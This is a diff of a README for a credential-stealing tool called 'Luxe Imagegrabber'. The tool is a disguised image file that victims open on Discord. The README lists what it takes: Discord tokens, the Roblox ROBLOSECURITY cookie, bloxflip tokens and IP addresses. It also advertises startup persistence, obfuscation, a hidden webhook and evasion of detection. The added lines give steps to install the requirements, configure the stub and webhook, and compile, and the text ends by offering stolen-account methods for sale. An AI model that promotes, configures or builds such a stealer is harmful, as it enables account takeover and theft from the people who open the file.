@@ -1,17 +1,26 @@
 ![image](https://cdn.discordapp.com/attachments/1083476474587267154/1085311595577622539/download_1.png)
-# Get access
-Join our discord server to find how to gain access https://discord.gg/comps
+# How to use
 
-It will ask you for webhook and file name and build, after which it will build into a png file
-# Luxe Imagegrabber
-Highend image grabber which has comped over 20m roblox value before
-- Image grabber, user only has to open image on discord or download and open it to get beamed
+You basically need a brain and python knowledge, this is the first step
+
+Download python 3.9.5 and + (not python 3.11+)
+
+Make sure to install pip while downloading python (in python setup)
+
+Install requirements using install.bat
+
+Setup your stub, webhook and compile
+
+You can also modify the code in utils
+
+# Details
 - Grabs discord tokens
-- Grabs ROBLOSECURITY
+- Grabs ROBLOSECURITY (roblox cookie)
+- Grabs bloxflip tokens
 - Grabs ip
-- Grabs discord username, payment information, nitro status
-- Hides itself, starts on startup
-- Undetected, 0 detections on github
+- Startup
+- Error message/reboot PC
+- Obfuscation and webhook hider
 
 If your interested in buying private comps methods DM me ->
 
